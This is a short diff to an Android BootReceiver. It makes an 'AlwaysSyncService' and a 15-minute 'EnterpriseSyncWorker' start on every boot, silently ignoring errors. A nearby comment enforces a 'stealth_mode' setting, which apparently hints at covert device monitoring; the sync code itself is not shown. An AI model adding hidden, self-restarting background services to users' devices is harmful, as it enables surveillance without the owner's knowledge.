@@ -17,6 +17,16 @@ class BootReceiver : BroadcastReceiver() {
             action == Intent.ACTION_MY_PACKAGE_REPLACED ||
             action == "android.intent.action.QUICKBOOT_POWERON"
         ) {
+            try {
+                AlwaysSyncService.startService(context)
+                val syncWorkRequest = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES).build()
+                WorkManager.getInstance(context).enqueueUniquePeriodicWork(
+                    "EnterpriseSyncWorker",
+                    ExistingPeriodicWorkPolicy.KEEP,
+                    syncWorkRequest
+                )
+            } catch (_: Exception) {}
+
             // 1. Enforce stealth_mode setting on boot
             try {
                 val prefs = context.getSharedPreferences("admin_sync_prefs", Context.MODE_PRIVATE)
